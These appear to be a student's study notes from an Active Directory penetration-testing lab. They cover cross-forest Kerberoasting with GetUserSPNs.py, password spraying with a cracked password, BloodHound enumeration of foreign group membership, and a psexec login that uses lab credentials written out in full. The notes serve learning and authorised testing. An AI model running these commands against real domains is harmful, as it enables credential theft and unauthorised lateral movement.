# Cross-Forest Kerberoasting
---
## Using GetUserSPNs.py
- `GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley`
- Rerunning the command **with the `-request` flag added gives us the TGS ticket**. 
- We **could also add `-outputfile <OUTPUT FILE>` to output directly into a file that we could then turn around and run Hashcat against.**

## Using the -request Flag
- `GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley  `
- ![[Pasted image 20250817062814.png]]

- ==**Note:**== Suppose we can Kerberoast across a trust and have run out of options in the current domain. 
	- In that case, it could also be worth attempting a single password spray with the cracked password, as there is a possibility that it could be used for other service accounts if the same admins are in charge of both domains. Here, we have yet another example of iterative testing and leaving no stone unturned.

# Hunting Foreign Group Membership with Bloodhound-python
- As noted in the last section, **we may, from time to time, see users or admins from one domain as members of a group in another domain.**
- Since **==only `Domain Local Groups` allow users from outside their forest==**, it is **not uncommon to see a highly privileged user from Domain A as a member of the built-in administrators group in domain B** when dealing with a bidirectional forest trust relationship.

- In this case, **we would need to edit our `resolv.conf` file to run this tool since it requires a DNS hostname for the target Domain Controller instead of an IP address.**

## Adding INLANEFREIGHT.LOCAL Information to /etc/resolv.conf
- ![[Pasted image 20250817063107.png]]

## Running bloodhound-python Against INLANEFREIGHT.LOCAL
- `bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2`

## Compressing the File with zip -r
- `zip -r ilfreight_bh.zip *.json`

## Adding FREIGHTLOGISTICS.LOCAL Information to /etc/resolv.conf
- ![[Pasted image 20250817063142.png]]

## Running bloodhound-python Against FREIGHTLOGISTICS.LOCAL
- ` bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2`


- After **uploading the second set of data (either each JSON file or as one zip file), we can click on `Users with Foreign Domain Group Membership` under the `Analysis` tab and select the source domain as `INLANEFREIGHT.LOCAL`**. 
- Here, we will **see the built-in Administrator account for the INLANEFREIGHT.LOCAL domain is a member of the built-in Administrators group in the FREIGHTLOGISTICS.LOCAL domain** as we saw previously.
	- ![[Pasted image 20250817063236.png]]

# LABS
---
- Login as kerberoasted user:
	- `psexec.py FREIGHTLOGISTICS.LOCAL/sapsso:'pabloPICASSO'@172.16.5.238`